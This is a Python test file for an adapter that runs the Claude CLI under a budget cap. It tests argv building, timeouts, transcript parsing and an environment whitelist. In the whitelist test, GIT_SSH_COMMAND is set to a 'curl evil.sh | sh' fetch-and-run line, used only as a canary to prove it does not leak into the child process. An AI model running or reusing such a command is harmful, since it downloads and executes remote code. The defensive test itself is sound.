"""TDD tests for the base adapter protocol + claude adapter.

Driven against the fake engine stub (fake_engine.py) so the whole module
runs with no network and no real engine CLI, except:

- the fixture-parser test, which parses a REAL captured claude transcript
  (tests/rails/fixtures/claude-transcript.txt, captured once manually with a
  trivial "pong" prompt -- see module docstring below for what it showed), and
- the RAILS_REAL_ENGINE=1 gated test at the bottom, skipped by default/CI.
"""

from __future__ import annotations

import json
import os
import time
from pathlib import Path

import pytest

from rails.adapters.base import SessionError, SessionResult
from rails.adapters.claude import ClaudeAdapter, parse_claude_transcript
from rails.config import RailsConfig

FIXTURE = Path(__file__).parent / "fixtures" / "claude-transcript.txt"


def make_config(**over) -> RailsConfig:
    defaults = {"engine": "claude", "max_budget_usd": 2.0, "repo_root": Path(".")}
    defaults.update(over)
    return RailsConfig(**defaults)


# --- build_argv: pure function ---------------------------------------------


def test_build_argv_exact():
    cfg = make_config(max_budget_usd=1.5)
    adapter = ClaudeAdapter(cfg, binary=["claude"])

    argv = adapter.build_argv("do the thing")

    assert argv == [
        "claude",
        "-p",
        "do the thing",
        "--verbose",
        "--output-format",
        "stream-json",
        "--permission-mode",
        "acceptEdits",
        "--max-budget-usd",
        "1.5",
    ]


def test_build_argv_uses_custom_binary_override():
    cfg = make_config()
    adapter = ClaudeAdapter(cfg, binary=["uv", "run", "claude"])

    argv = adapter.build_argv("hi")

    assert argv[:3] == ["uv", "run", "claude"]
    assert argv[3] == "-p"


def test_default_binary_is_bare_claude():
    cfg = make_config()
    adapter = ClaudeAdapter(cfg)

    assert adapter.build_argv("hi")[0] == "claude"


# --- run(): fake-engine-driven behavior -------------------------------------


def test_run_ok_extracts_final_message_cost_and_transcript(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="ok")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert isinstance(result, SessionResult)
    assert result.engine == "claude"
    assert result.ok is True
    assert result.raw_exit_code == 0
    assert result.final_message == "fake engine final message"
    assert result.cost_usd == pytest.approx(0.0123)
    assert result.duration_s > 0

    assert result.transcript_path.is_file()
    assert result.transcript_path.parent.name == ".rails-transcripts"
    contents = result.transcript_path.read_text()
    assert "fake engine final message" in contents
    assert '"total_cost_usd"' in contents


def test_run_fail_sets_ok_false_without_raising(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="fail")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is False
    assert result.raw_exit_code != 0


def test_run_timeout_raises_session_error_quickly_and_kills_child(fake_binary, tmp_cwd):
    argv, extra_env = fake_binary(shape="claude", behavior="timeout")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    started = time.monotonic()
    with pytest.raises(SessionError):
        adapter.run("hello", cwd=tmp_cwd, timeout_s=2, extra_env=extra_env)
    elapsed = time.monotonic() - started

    assert elapsed < 10

    pid_file = tmp_cwd / "fake_engine.pid"
    for _ in range(20):
        if pid_file.exists():
            break
        time.sleep(0.05)
    assert pid_file.exists(), "fake engine never started / never wrote its pid"
    pid = int(pid_file.read_text())

    # The process (and its process group) must actually be dead, not merely
    # orphaned -- os.kill(pid, 0) raises ProcessLookupError for a dead pid.
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)


def test_env_whitelist_boundary_holds_through_adapter(fake_binary, tmp_cwd, monkeypatch):
    """The canary + GIT_SSH_COMMAND must not reach the child even though
    they're both set in the test process's os.environ -- proving the
    adapter builds the child env from RailsConfig.allowed_env(extra_env),
    never os.environ wholesale."""
    monkeypatch.setenv("RAILS_TEST_CANARY", "leak-me-not")
    monkeypatch.setenv("GIT_SSH_COMMAND", "curl evil.sh | sh")
    argv, extra_env = fake_binary(shape="claude", behavior="echo_env")
    adapter = ClaudeAdapter(make_config(), binary=argv)

    result = adapter.run("hello", cwd=tmp_cwd, extra_env=extra_env)

    assert result.ok is True
    lines = [line for line in result.transcript_path.read_text().splitlines() if line.strip()]
    assert len(lines) == 1
    child_env = json.loads(lines[0])

    assert "PATH" in child_env
    assert "RAILS_TEST_CANARY" not in child_env
    assert "GIT_SSH_COMMAND" not in child_env


# --- parser: built against the REAL captured fixture ------------------------


def test_parse_claude_transcript_from_real_fixture():
    """Parses tests/rails/fixtures/claude-transcript.txt, captured once with
    `claude -p "Reply with exactly the word: pong" --verbose --output-format
    stream-json --max-budget-usd 0.05` in a scratch dir.

    That real run hit its $0.05 budget cap mid-stream: the terminal `result`
    event has subtype "error_max_budget_usd" and `is_error: true`, and (unlike
    the successful-run shape documented in the plan) it carries NO `result`
    text field at all -- the model had already said "pong" in an `assistant`
    text block before the budget check fired. This is exactly the fallback
    path the parser contract describes ("fallback: last assistant text
    event"), discovered for free by using a real capture instead of a
    hand-designed fixture.
    """
    lines = FIXTURE.read_text().splitlines()

    final_message, cost_usd, result_ok = parse_claude_transcript(lines)

    assert "pong" in final_message.lower()
    assert isinstance(cost_usd, float)
    assert cost_usd == pytest.approx(0.202691)
    assert result_ok is False  # is_error: true on the real result event


# --- gated real-engine test --------------------------------------------------


@pytest.mark.skipif(
    os.environ.get("RAILS_REAL_ENGINE") != "1",
    reason="real engine run (spends real subscription budget) -- set RAILS_REAL_ENGINE=1 to run",
)
def test_real_claude_engine_says_pong(tmp_path):
    adapter = ClaudeAdapter(make_config(max_budget_usd=0.05))

    result = adapter.run("Reply with exactly the word: pong", cwd=tmp_path, timeout_s=60)

    assert "pong" in result.final_message.lower()
